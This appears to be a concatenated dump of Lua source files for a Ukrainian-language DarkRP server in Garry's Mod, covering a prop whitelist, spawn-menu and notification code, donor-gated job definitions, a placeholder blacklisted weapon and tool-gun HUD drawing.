		"models/props_phx/construct/wood/wood_panel2x4.mdl",
		"models/props_phx/construct/wood/wood_panel4x4.mdl",
		"models/props_phx/construct/wood/wood_wire1x1.mdl",
		"models/props_phx/construct/wood/wood_wire1x1x1.mdl",
		"models/props_phx/construct/wood/wood_wire1x1x2.mdl",
		"models/props_phx/construct/wood/wood_wire1x1x2b.mdl",
		"models/props_phx/construct/wood/wood_wire1x2.mdl",
		"models/props_phx/construct/wood/wood_wire1x2b.mdl",
		"models/props_phx/construct/wood/wood_wire1x2x2b.mdl",
		"models/props_phx/construct/wood/wood_wire2x2.mdl",
		"models/props_phx/construct/wood/wood_wire2x2b.mdl",
		"models/props_phx/construct/wood/wood_wire2x2x2b.mdl",
		"models/props_phx/empty_barrel.mdl",
		"models/props_phx/games/chess/black_bishop.mdl",
		"models/props_phx/games/chess/black_dama.mdl",
		"models/props_phx/games/chess/black_king.mdl",
		"models/props_phx/games/chess/black_knight.mdl",
		"models/props_phx/games/chess/black_pawn.mdl",
		"models/props_phx/games/chess/black_queen.mdl",
		"models/props_phx/games/chess/black_rook.mdl",
		"models/props_phx/games/chess/white_bishop.mdl",
		"models/props_phx/games/chess/white_dama.mdl",
		"models/props_phx/games/chess/white_king.mdl",
		"models/props_phx/games/chess/white_knight.mdl",
		"models/props_phx/games/chess/white_pawn.mdl",
		"models/props_phx/games/chess/white_queen.mdl",
		"models/props_phx/games/chess/white_rook.mdl",
		"models/props_phx/misc/fender.mdl",
		"models/props_phx/misc/t_light_head.mdl",
		"models/props_phx/rt_screen.mdl",
		"models/props_rooftop/satellitedish02.mdl",
		"models/props_rooftop/sign_letter02_e002.mdl",
		"models/props_rooftop/sign_letter02_k002.mdl",
		"models/props_rooftop/sign_letter02_rus1002.mdl",
		"models/props_rooftop/sign_letter_f001b.mdl",
		"models/props_rooftop/sign_letter_h001.mdl",
		"models/props_rooftop/sign_letter_m001.mdl",
		"models/props_rooftop/sign_letter_t001.mdl",
		"models/props_rooftop/sign_letter_u001b.mdl",
		"models/props_trainstation/benchoutdoor01a.mdl",
		"models/props_trainstation/bench_indoor001a.mdl",
		"models/props_trainstation/payphone001a.mdl",
		"models/props_trainstation/tracksign02.mdl",
		"models/props_trainstation/tracksign07.mdl",
		"models/props_trainstation/tracksign08.mdl",
		"models/props_trainstation/tracksign09.mdl",
		"models/props_trainstation/tracksign10.mdl",
		"models/props_trainstation/traincar_seats001.mdl",
		"models/props_trainstation/trainstation_arch001.mdl",
		"models/props_trainstation/trainstation_clock001.mdl",
		"models/props_trainstation/trainstation_post001.mdl",
		"models/props_trainstation/trashcan_indoor001a.mdl",
		"models/props_trainstation/trashcan_indoor001b.mdl",
		"models/props_vehicles/carparts_door01a.mdl",
		"models/props_vehicles/carparts_tire01a.mdl",
		"models/props_wasteland/barricade001a.mdl",
		"models/props_wasteland/barricade002a.mdl",
		"models/props_wasteland/buoy01.mdl",
		"models/props_wasteland/cafeteria_table001a.mdl",
		"models/props_wasteland/controlroom_chair001a.mdl",
		"models/props_wasteland/controlroom_desk001a.mdl",
		"models/props_wasteland/controlroom_desk001b.mdl",
		"models/props_wasteland/controlroom_filecabinet001a.mdl",
		"models/props_wasteland/controlroom_filecabinet002a.mdl",
		"models/props_wasteland/controlroom_monitor001a.mdl",
		"models/props_wasteland/dockplank01b.mdl",
		"models/props_wasteland/exterior_fence001a.mdl",
		"models/props_wasteland/exterior_fence001b.mdl",
		"models/props_wasteland/exterior_fence002a.mdl",
		"models/props_wasteland/exterior_fence002b.mdl",
		"models/props_wasteland/exterior_fence002c.mdl",
		"models/props_wasteland/exterior_fence002d.mdl",
		"models/props_wasteland/exterior_fence003a.mdl",
		"models/props_wasteland/exterior_fence003b.mdl",
		"models/props_wasteland/gaspump001a.mdl",
		"models/props_wasteland/interior_fence001a.mdl",
		"models/props_wasteland/interior_fence001b.mdl",
		"models/props_wasteland/interior_fence001c.mdl",
		"models/props_wasteland/interior_fence001d.mdl",
		"models/props_wasteland/interior_fence001e.mdl",
		"models/props_wasteland/interior_fence001g.mdl",
		"models/props_wasteland/interior_fence002a.mdl",
		"models/props_wasteland/interior_fence002b.mdl",
		"models/props_wasteland/interior_fence002c.mdl",
		"models/props_wasteland/interior_fence002d.mdl",
		"models/props_wasteland/interior_fence002e.mdl",
		"models/props_wasteland/interior_fence002f.mdl",
		"models/props_wasteland/interior_fence003a.mdl",
		"models/props_wasteland/interior_fence003b.mdl",
		"models/props_wasteland/interior_fence003d.mdl",
		"models/props_wasteland/interior_fence003e.mdl",
		"models/props_wasteland/interior_fence003f.mdl",
		"models/props_wasteland/kitchen_counter001a.mdl",
		"models/props_wasteland/kitchen_counter001b.mdl",
		"models/props_wasteland/kitchen_counter001c.mdl",
		"models/props_wasteland/kitchen_counter001d.mdl",
		"models/props_wasteland/kitchen_shelf001a.mdl",
		"models/props_wasteland/kitchen_shelf002a.mdl",
		"models/props_wasteland/kitchen_stove001a.mdl",
		"models/props_wasteland/kitchen_stove002a.mdl",
		"models/props_wasteland/laundry_basket001.mdl",
		"models/props_wasteland/laundry_cart001.mdl",
		"models/props_wasteland/laundry_cart002.mdl",
		"models/props_wasteland/laundry_washer003.mdl",
		"models/props_wasteland/light_spotlight01_lamp.mdl",
		"models/props_wasteland/prison_bedframe001b.mdl",
		"models/props_wasteland/prison_celldoor001a.mdl",
		"models/props_wasteland/prison_celldoor001b.mdl",
		"models/props_wasteland/prison_cellwindow002a.mdl",
		"models/props_wasteland/prison_heater001a.mdl",
		"models/props_wasteland/prison_lamp001c.mdl",
		"models/props_wasteland/prison_shelf002a.mdl",
		"models/props_wasteland/prison_sink001a.mdl",
		"models/props_wasteland/prison_toilet01.mdl",
		"models/props_wasteland/speakercluster01a.mdl",
		"models/props_wasteland/wood_fence01a.mdl",
		"models/props_wasteland/wood_fence02a.mdl"
	}
}
--PATH gamemodes/darkrp/gamemode/core/sandbox/init_sh.lua:
cleanup.Register("props")
cleanup.Register("ragdolls")
cleanup.Register("effects")
cleanup.Register("npcs")
cleanup.Register("constraints")
cleanup.Register("ropeconstraints")
cleanup.Register("sents")
cleanup.Register("vehicles")


if (SERVER) then
	function GM:CreateEntityRagdoll(entity, ragdoll)
		-- Replace the entity with the ragdoll in cleanups etc
		undo.ReplaceEntity(entity, ragdoll)
		cleanup.ReplaceEntity(entity, ragdoll)
	end

	return
end

function GM:OnUndo(name, strCustomString)
	notification.AddLegacy((strCustomString and strCustomString or "#Undone_" .. name), NOTIFY_UNDO, 2)

	surface.PlaySound("buttons/button15.wav")
end

function GM:OnCleanup(name)
	notification.AddLegacy("#Cleaned_" .. name, NOTIFY_CLEANUP, 5)

	surface.PlaySound("buttons/button15.wav")
end
--PATH gamemodes/darkrp/gamemode/core/sandbox/spawnmenu/controls/ctrlcolor_cl.lua:
--
--  ___  ___   _   _   _    __   _   ___ ___ __ __
-- |_ _|| __| / \ | \_/ |  / _| / \ | o \ o \\ V /
--  | | | _| | o || \_/ | ( |_n| o ||   /   / \ /
--  |_| |___||_n_||_| |_|  \__/|_n_||_|\\_|\\ |_|  2009
--
--


local PANEL = {}

AccessorFunc(PANEL, "m_ConVarR", 				"ConVarR")
AccessorFunc(PANEL, "m_ConVarG", 				"ConVarG")
AccessorFunc(PANEL, "m_ConVarB", 				"ConVarB")
AccessorFunc(PANEL, "m_ConVarA", 				"ConVarA")

local ColorRows = 16

--[[---------------------------------------------------------
	Name: Init
-----------------------------------------------------------]]
function PANEL:Init()

	self.Mixer = vgui.Create("DColorMixer", self)
	self.Mixer:Dock(FILL)
	self:SetTall(230)

end

--[[---------------------------------------------------------
	Name: PerformLayout
-----------------------------------------------------------]]
function PANEL:PerformLayout(x, y)

	-- We try to avoid the ugly gap on the right.
	-- This seems a bit heavy handed to be calling in PerformLayout.
	self.Mixer.Palette:SetButtonSize(self:GetWide() / ColorRows)

end

--[[---------------------------------------------------------
	Name: SetLabel
-----------------------------------------------------------]]
function PANEL:SetLabel(text)

	self.Mixer:SetLabel(text)

end

--[[---------------------------------------------------------
	Name: Paint
-----------------------------------------------------------]]
function PANEL:Paint()

	-- Invisible background!

end

--[[---------------------------------------------------------
   Name: ConVarR
-----------------------------------------------------------]]
function PANEL:SetConVarR(cvar)

	self.Mixer:SetConVarR(cvar)

end

--[[---------------------------------------------------------
   Name: ConVarG
-----------------------------------------------------------]]
function PANEL:SetConVarG(cvar)

	self.Mixer:SetConVarG(cvar)

end

--[[---------------------------------------------------------
   Name: ConVarB
-----------------------------------------------------------]]
function PANEL:SetConVarB(cvar)

	self.Mixer:SetConVarB(cvar)

end

--[[---------------------------------------------------------
   Name: ConVarA
-----------------------------------------------------------]]
function PANEL:SetConVarA(cvar)

	self.Mixer:SetConVarA(cvar)

end


vgui.Register("CtrlColor", PANEL, "DPanel")
--PATH gamemodes/darkrp/gamemode/core/sandbox/spawnmenu/creationmenu/content/contenttypes/weapons_cl.lua:
hook("PopulateWeapons", "AddWeaponContent", function(pnlContent, tree, node)

	-- Loop through the weapons and add them to the menu
	local Weapons = list.Get("Weapon")
	local Categorised = {}


	-- Build into categories
	for k, weapon in pairs(Weapons) do

		if (!weapon.Spawnable) then continue end

		Categorised[ weapon.Category ] = Categorised[ weapon.Category ] or {}
		table.insert(Categorised[ weapon.Category ], weapon)

	end

	Weapons = nil

	-- Loop through each category
	for CategoryName, v in SortedPairs(Categorised) do

		-- Add a node to the tree
		local node = tree:AddNode(CategoryName, "icon16/gun.png")

		-- When we click on the node - populate it using this function
		node.DoPopulate = function(self)

			-- If we've already populated it - forget it.
			if (self.PropPanel) then return end

			-- Create the container panel
			self.PropPanel = vgui.Create("ContentContainer", pnlContent)
			self.PropPanel:SetVisible(false)
			self.PropPanel:SetTriggerSpawnlistChange(false)

			for k, ent in SortedPairsByMemberValue(v, "PrintName") do

				spawnmenu.CreateContentIcon( ent.ScriptedEntityType or "weapon", self.PropPanel,
				{
					nicename	= ent.PrintName or ent.ClassName,
					spawnname	= ent.ClassName,
					material	= "entities/"..ent.ClassName..".png",
					admin		= ent.AdminOnly
				})

			end

		end

		-- If we click on the node populate it and switch to it.
		node.DoClick = function(self)

			self:DoPopulate()
			pnlContent:SwitchPanel(self.PropPanel)

		end

	end


	-- Select the first node
	local FirstNode = tree:Root():GetChildNode(0)
	if (IsValid(FirstNode)) then
		FirstNode:InternalDoClick()
	end

end )

spawnmenu.AddCreationTab("#spawnmenu.category.weapons", function()

	local ctrl = vgui.Create("SpawnmenuContentPanel")
	ctrl:CallPopulateHook("PopulateWeapons")
	return ctrl

end, "icon16/gun.png", 10, nil, function() return IsValid(LocalPlayer()) and LocalPlayer():IsSuperAdmin() end )
--PATH gamemodes/darkrp/gamemode/core/terms/notify/init_cl.lua:
local notify_types = {
	[0] = Color( 255, 100, 100 ),
	[1] = Color( 255, 30, 30 ),
}

net.Receive( 'rp.NotifyString', function() chat.AddText( notify_types[net.ReadBit()], '[~] ', unpack( rp.ReadMsg() ) ) end )
net.Receive( 'rp.Notify', function()
	local str = net.ReadString()
	local msgg = net.ReadString()
	local gs = net.ReadString()
	local replace = { str }
	local count = 0
	msgg = msgg:gsub( '#', function()
		count = count + 1
		local v = replace[count]
		local t = type( v )
		if t == 'Player' then
			if not IsValid( v ) then return 'Unknown' end
			return v:Name()
		elseif t == 'Entity' then
			if not IsValid( v ) then return 'Invalid Entity' end
			return v.PrintName and v.PrintName or v:GetClass()
		end
		return v
	end )

	notification.AddLegacy( msgg, tonumber( gs ), 4 )
end )

function rp.notfiy( text )
	chat.AddText( notify_types[1], '[~] ', text )
end

function rp.Notify( notify_type, msg, ... )
	local replace = { ... }
	local count = 0
	msg = msg:gsub( '#', function()
		count = count + 1
		local v = replace[count]
		local t = type( v )
		if t == 'Player' then
			if not IsValid( v ) then return 'Unknown' end
			return v:Name()
		elseif t == 'Entity' then
			if not IsValid( v ) then return 'Invalid Entity' end
			return v.PrintName and v.PrintName or v:GetClass()
		end
		return v
	end )

	notification.AddLegacy( msg, notify_type, 4 )
end

function rp.ChatPrint( data )
	local ply = data.ply
	if not IsValid( ply ) then return end
	local color = data.color or Color( 200, 200, 200 )
	local title = data.title or '[NONE]'
	local postcolor = data.pcolor or color_white
	local postname = data.postname or ': '
	local text = data.text or ';('
	if ply:onyx_GetNetVar( 'Disgue' ) then
		chat.AddText( color, title, Color( 50, 50, 50 ), '*Ім\'я Приховано*', postcolor, postname, text )
	elseif ply:onyx_GetNetVar( 'Disguise_G' ) then
		local gg = sam.player.get_nwvar( ply, 'Job_Color' ) or color_white
		chat.AddText( color, title, Color( gg.r, gg.g, gg.b, 100 ), ply:Name(), postcolor, postname, text )
	else
		chat.AddText( color, title, ply:GetJobColor(), ply:Name(), postcolor, postname, text )
	end
end

net.Receive( 'rp.ChatPrint', function() rp.ChatPrint( net.ReadTable() ) end )
--PATH addons/__________scripts__loader/lua/scriptssss/_all_server/sh_jobs.lua:
TEAM_ZZZZZZZZZZZZZZZZZZZZZALUPA_Rendjer = rp.AddTeam( "Рейнджер", {
    Color = Color( 0, 0, 0 ),
    Model = { "models/sirris/ota/otabloodborne_pm.mdl" },
    Description = [[
 
    ПРИВАТНА ПРОФЕСІЯ
 
    Робот виготовлений на замовлення спецслужб.

    ]],
    Weapons = {},
    Command = "Rendjer",
    Max = 3,
    Salary = 300,
    admin = 0,
    IsDisguse = false,
    mozhnovnegodisguse = false,
    category = "Приватні Професіонали",
    vote = false,
    Armor = 200,
    Police = true,
    hasLicense = true,
    nocuff = true,
    PlayerLoadout = function( ply )
        ply:SetMaxArmor( 200 )
        ply:SetMaxHealth( 200 )
        ply:SetHealth( 200 )
    end,
    candemote = false,
    canSee = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobrendjer' ) or ply:IsRoot() end,
    customCheck = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobrendjer' ) or ply:IsRoot() end,
    Spawn = rp.Setting.PoliceSpawn,
} )

TEAM_ZZZZZZZZZZZZZZZZZZZZZALUPA_Yakuza = rp.AddTeam( "Якудза", {
    Color = Color( 58, 0, 112 ),
    Model = { "models/player/voikanaa/kazuma_kiryu.mdl" },
    Description = [[
 
    ПРИВАТНА ПРОФЕСІЯ
 
    Елітний боєць Японської мафії, який в змозі постояти за себе.

    ]],
    Weapons = { "m9k_thompson" },
    Command = "Yakuza",
    Max = 5,
    Salary = 300,
    admin = 0,
    IsDisguse = false,
    mozhnovnegodisguse = false,
    category = "Приватні Професіонали",
    vote = false,
    Armor = 120,
    hasLicense = false,
    PlayerLoadout = function( ply )
        ply:SetMaxArmor( 120 )
        ply:SetMaxHealth( 120 )
        ply:SetHealth( 120 )
    end,
    candemote = false,
    canSee = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobyakuza' ) or ply:IsRoot() end,
    customCheck = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobyakuza' ) or ply:IsRoot() end
} )

TEAM_ADMI3dwae21wN3_Naruto = rp.AddTeam( "Naruto", {
    Color = Color( 218, 203, 0 ),
    Model = { "models/player/naruto_sixpath/naruto_sixpath.mdl" },
    Description = [[
 
    Герой відомого аніме, професійний ніндзя
    ]],
    Weapons = { "weapon_narutorun" },
    Command = "naruto",
    Max = 3,
    Salary = 300,
    admin = 0,
    IsDisguse = false,
    category = "Приватні Професіонали",
    vote = false,
    Armor = 0,
    hasLicense = false,
    PlayerLoadout = function( ply )
        ply:SetMaxHealth( 150 )
        ply:SetHealth( 150 )
        ply:SetArmor( 150 )
        ply:SetMaxArmor( 150 )
    end,
    candemote = false,
    mozhnovnegodisguse = false,
    canSee = function( ply ) return ply:IsRoot() or BATTLEPASS:GetPermanentVariable( ply, 'jobnaruto' ) end,
    customCheck = function( ply ) return ply:IsRoot() or BATTLEPASS:GetPermanentVariable( ply, 'jobnaruto' ) end,
} )

TEAM_ADMI3dwae21wN3_Grom = rp.AddTeam( "Гром", {
    Color = Color( 15, 126, 0 ),
    Model = { "models/player/01ar_combine_soldier01.mdl" },
    Description = [[
    
    Надважкий боєць ССО, який працює на стороні військових.
    
    ]],
    Weapons = { 'm9k_m60' },
    Command = "grom",
    Max = 3,
    Salary = 300,
    admin = 0,
    IsDisguse = false,
    category = "Приватні Професіонали",
    vote = false,
    Armor = 0,
    Spawn = rp.Setting.MilSpawn,
    hasLicense = false,
    PlayerLoadout = function( ply )
        ply:SetMaxHealth( 125 )
        ply:SetHealth( 125 )
        ply:SetArmor( 300 )
        ply:SetMaxArmor( 300 )
        ply:SetRunSpeed( rp.Setting.DefaultSpeedRun * 0.6 )
    end,
    candemote = false,
    mozhnovnegodisguse = false,
    canSee = function( ply ) return ply:IsRoot() or BATTLEPASS:GetPermanentVariable( ply, 'jobgrom' ) end,
    customCheck = function( ply ) return ply:IsRoot() or BATTLEPASS:GetPermanentVariable( ply, 'jobgrom' ) end,
} )

TEAM_ZZZZZZZZZZZZZZZZZZZZZALUPA_Saitama = rp.AddTeam( "Сайтама", {
    Color = Color( 255, 255, 255 ),
    Model = { "models/pacagma/one_punch_man/saitama/saitama_player.mdl" },
    Description = [[
 
    ПРИВАТНА ПРОФЕСІЯ
 
    Фір рп від трьох, відключає анті фір-рп іншим професіям які знаходяться в його полі зору. Може носити усі класи зброї.

    ]],
    Weapons = { "weapon_claws" },
    Command = "Saitama",
    Max = 3,
    Salary = 300,
    admin = 0,
    IsDisguse = false,
    mozhnovnegodisguse = false,
    category = "Приватні Професіонали",
    vote = false,
    Armor = 150,
    Police = true,
    hasLicense = true,
    nocuff = true,
    PlayerLoadout = function( ply ) ply:SetMaxArmor( 150 ) end,
    candemote = false,
    canSee = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobsaitama' ) or ply:IsRoot() end,
    customCheck = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobsaitama' ) or ply:IsRoot() end,
    Spawn = rp.Setting.PoliceSpawn,
} )

TEAM_ZZZZZZZZZZZZZZZZZZZZZALUPA_Gopnik = rp.AddTeam( "Гопнік", {
    Color = Color( 255, 255, 255 ),
    Model = { "models/half-dead/Gopniks/extra/playermodelonly.mdl" },
    Description = [[
 
    ПРИВАТНА ПРОФЕСІЯ
 
    Часткове відключення Armed RP, дозволено грабувати всух, окрім гос., побачивши Гос., Військових мусить втікти. 

    Дозволено використовувати лише трубу ("weapon_hl2pipe"), ніж, кунай.
    Дозволено вбивати лише при загрозі бути посадженим.
    Може співпрацювати лише з іншими гопніками.

    ]],
    Weapons = { "weapon_hl2pipe" },
    Command = "Gopnik",
    Max = 5,
    Salary = 300,
    admin = 0,
    IsDisguse = false,
    category = "Приватні Професіонали",
    vote = false,
    Armor = 0,
    Police = false,
    hasLicense = false,
    candemote = false,
    canSee = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobgopnik' ) or ply:IsRoot() end,
    customCheck = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobgopnik' ) or ply:IsRoot() end,
} )

TEAM_SECTANT = rp.AddTeam( 'Сектант', {
    Color = Color( 0, 0, 0 ),
    Model = { 'models/dejtriyev/cof/psycho.mdl' },
    Description = [[
 
    Ви є вірним послідовником своєї віри або ідеології.
    Проповідуйте свої переконання серед інших людей і залучайте нових прихильників.
    У вас є змога брати участь у священних ритуалах та зборах вашої громади.
    Ви можете використовувати силу переконання, щоб поширювати ідеї вашої спільноти та підтримувати її єдність.
    Дотримуйтесь правил своєї групи, допомагайте її членам та захищайте її від зовнішнього впливу.

    ]],
    Weapons = { 'swb_knife', 'weapon_cuff_rope' },
    Command = 'Sectant',
    Max = 5,
    Salary = 300,
    admin = 0,
    IsDisguse = false,
    category = 'Приватні Професіонали',
    vote = false,
    Armor = 0,
    Police = false,
    hasLicense = false,
    candemote = false,
    mozhnovnegodisguse = false,
    canSee = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobsektant' ) or ply:IsRoot() end,
    customCheck = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobsektant' ) or ply:IsRoot() end,
} )

TEAM_SPONGEBOB = rp.AddTeam( 'Губка Боб', {
    Color = Color( 255, 255, 0 ),
    Model = { 'models/poxyk/sponge/spongebob_pm.mdl', 'models/larryeedwards/misc/drunksb/sb_drunk.mdl' },
    Description = [[
 
    Губка Боб, життєрадісний мешканець невеличкого каналу з водою!
    Досліджуйте його дно в пошуках пригод разом зі своїм...
    Використовуйте свою доброту та ентузіазм, щоб допомагати іншим мешканцям озера та створювати веселу атмосферу:).

    ]],
    Weapons = { '47_ethereal' },
    Command = 'SpongeBob',
    Max = 1,
    Salary = 300,
    admin = 0,
    IsDisguse = false,
    category = 'Приватні Професіонали',
    vote = false,
    Armor = 0,
    Police = false,
    hasLicense = false,
    candemote = false,
    mozhnovnegodisguse = false,
    PlayerLoadout = function( ply ) ply:SetArmor( 100 ) end,
    canSee = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobspongebob' ) or ply:IsRoot() end,
    customCheck = function( ply ) return BATTLEPASS:GetPermanentVariable( ply, 'jobspongebob' ) or ply:IsRoot() end,
} )

rp.AddDoorGroup( 'Військові', TEAM_ADMI3dwae21wN3_Grom )
rp.AddDoorGroup( 'Держава', TEAM_ADMI3WWWdadtW, TEAM_ZZZZZZZZZZZZZZZZZZZZZALUPA_Rendjer, TEAM_ZZZZZZZZZZZZZZZZZZZZZALUPA_Saitama )
--PATH addons/__main/lua/weapons/bobs_blacklisted/shared.lua:
-- Variables that are used on both client and server
SWEP.Gun = ("bobs_blacklisted")
SWEP.Category				= ""
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "you're holding a blacklisted weapon!"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 1			-- Position in the slot
SWEP.DrawAmmo				= false		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= false		-- set false if you want no crosshair
SWEP.Weight				= 0			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= false		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "normal"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.SelectiveFire		= false

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= false
SWEP.ViewModel				= "models/weapons/v_hands.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_suitcase_passenger.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= false
SWEP.AdminSpawnable			= false
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= ("")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 1			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 0		-- Size of a clip
SWEP.Primary.DefaultClip		= 0		-- Bullets you start with
SWEP.Primary.KickUp				= 0		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= false		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "false"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.Secondary.IronFOV			= 0		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 0		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 0	-- Base damage per bullet
SWEP.Primary.Spread		= 0	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = 0 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(0,0,0)
SWEP.IronSightsAng = Vector(0, 0, 0)
SWEP.SightsPos = Vector(0,0,0)
SWEP.SightsAng = Vector(0, 0, 0)
SWEP.RunSightsPos = Vector (0,0,0)
SWEP.RunSightsAng = Vector (0,0,0)

SWEP.BlackListed = true

function SWEP:PrimaryAttack()
self.Owner:PrintMessage(HUD_PRINTCENTER, "THIS WEAPON HAS BEEN BLACKLISTED")
end
function SWEP:SecondaryAttack()
self.Owner:PrintMessage(HUD_PRINTCENTER, "THIS WEAPON HAS BEEN BLACKLISTED")
end

function SWEP:Think()
end
--PATH gamemodes/darkrp/entities/weapons/gmod_tool/cl_init.lua:

local gmod_drawhelp = CreateClientConVar("gmod_drawhelp", "1", true, false)
local gmod_toolmode = CreateClientConVar("gmod_toolmode", "rope", true, true)
-- 215 
cvars.AddChangeCallback("gmod_toolmode", function(name, old, new)
	if (old == new) then return end
	spawnmenu.ActivateTool(new, true)
end, "gmod_toolmode_panel" )

include("shared.lua")
include("cl_viewscreen.lua")

SWEP.PrintName		= "Tool Gun"
SWEP.Slot			= 4
SWEP.SlotPos		= 6
SWEP.DrawAmmo		= false
SWEP.DrawCrosshair	= true

SWEP.WepSelectIcon = surface.GetTextureID("vgui/gmod_tool")
SWEP.Gradient = surface.GetTextureID("gui/gradient")
SWEP.InfoIcon = surface.GetTextureID("gui/info")

SWEP.ToolNameHeight = 0
SWEP.InfoBoxHeight = 0

surface.CreateFont( "GModToolName",
{
	font = "Roboto Bk",
	size = 80,
	weight = 1000
})

surface.CreateFont( "GModToolSubtitle",
{
	font = "Roboto Bk",
	size = 24,
	weight = 1000
})

surface.CreateFont( "GModToolHelp",
{
	font = "Roboto Bk",
	size = 17,
	weight = 1000
})

--[[---------------------------------------------------------
	Draws the help on the HUD (disabled if gmod_drawhelp is 0)
-----------------------------------------------------------]]
function SWEP:DrawHUD()

	local mode = gmod_toolmode:GetString()

	-- Don't draw help for a nonexistant tool!
	if (!self:GetToolObject()) then return end

	self:GetToolObject():DrawHUD()

	if (!gmod_drawhelp:GetBool()) then return end

	-- This could probably all suck less than it already does

	local x, y = 50, 40
	local w, h = 0, 0

	local TextTable = {}
	local QuadTable = {}

	QuadTable.texture = self.Gradient
	QuadTable.color = Color(10, 10, 10, 180)

	QuadTable.x = 0
	QuadTable.y = y - 8
	QuadTable.w = 600
	QuadTable.h = self.ToolNameHeight - (y - 8)
	draw.TexturedQuad(QuadTable)

	TextTable.font = "GModToolName"
	TextTable.color = Color(240, 240, 240, 255)
	TextTable.pos = { x, y }
	TextTable.text = "#tool." .. mode .. ".name"
	w, h = draw.TextShadow(TextTable, 2)
	y = y + h

	TextTable.font = "GModToolSubtitle"
	TextTable.pos = { x, y }
	TextTable.text = "#tool." .. mode .. ".desc"
	w, h = draw.TextShadow(TextTable, 1)
	y = y + h + 8

	self.ToolNameHeight = y

	QuadTable.y = y
	QuadTable.h = self.InfoBoxHeight
	local alpha =  math.Clamp(255 + (self:GetToolObject().LastMessage - CurTime()) * 800, 10, 255)
	QuadTable.color = Color(alpha, alpha, alpha, 230)
	draw.TexturedQuad(QuadTable)

	y = y + 4

	TextTable.font = "GModToolHelp"

	if (!self:GetToolObject().Information) then
		TextTable.pos = { x + self.InfoBoxHeight, y  }
		TextTable.text = self:GetToolObject():GetHelpText()
		w, h = draw.TextShadow(TextTable, 1)

		surface.SetDrawColor(255, 255, 255, 255)
		surface.SetTexture(self.InfoIcon)
		surface.DrawTexturedRect(x + 1, y + 1, h - 3, h - 3)

		self.InfoBoxHeight = h + 8

		return
	end

	local h2 = 0

	for k, v in pairs(self:GetToolObject().Information) do
		if isstring(v) then v = { name = v } end

		if (!v.name) then continue end
		if (v.stage && v.stage != self:GetStage()) then continue end
		if (v.op && v.op != self:GetToolObject():GetOperation()) then continue end

		local txt = "#tool." .. GetConVarString("gmod_toolmode") .. "." .. v.name
		if (v.name == "info") then
			txt = self:GetToolObject():GetHelpText()
		end

		TextTable.text = txt
		TextTable.pos = { x + 21, y + h2 }

		w, h = draw.TextShadow(TextTable, 1)

		if (!v.icon) then
			if (v.name:StartWith("info")) then v.icon = "gui/info" end
			if (v.name:StartWith("left")) then v.icon = "gui/lmb.png" end
			if (v.name:StartWith("right")) then v.icon = "gui/rmb.png" end
			if (v.name:StartWith("reload")) then v.icon = "gui/r.png" end
		end
		if (!v.icon2 && v.name:EndsWith("use")) then v.icon2 = "gui/e.png" end

		self.Icons = self.Icons or {}
		if (v.icon && !self.Icons[ v.icon ] ) then self.Icons[ v.icon ] = Material(v.icon) end
		if (v.icon2 && !self.Icons[ v.icon2 ] ) then self.Icons[ v.icon2 ] = Material(v.icon2) end

		if (v.icon && self.Icons[ v.icon ] && !self.Icons[ v.icon ]:IsError()) then
			surface.SetDrawColor(255, 255, 255, 255)
			surface.SetMaterial(self.Icons[ v.icon ])
			surface.DrawTexturedRect(x, y + h2, 16, 16)
		end

		if (v.icon2 && self.Icons[ v.icon2 ] && !self.Icons[ v.icon2 ]:IsError()) then
			surface.SetDrawColor(255, 255, 255, 255)
			surface.SetMaterial(self.Icons[ v.icon2 ])
			surface.DrawTexturedRect(x - 25, y + h2, 16, 16)

			draw.SimpleText("+", onyx.Font('Comfortaa@22'), x - 8, y + h2 + 2, color_white)
		end

		h2 = h2 + h

	end

	self.InfoBoxHeight = h2 + 8

end

function SWEP:SetStage(...)
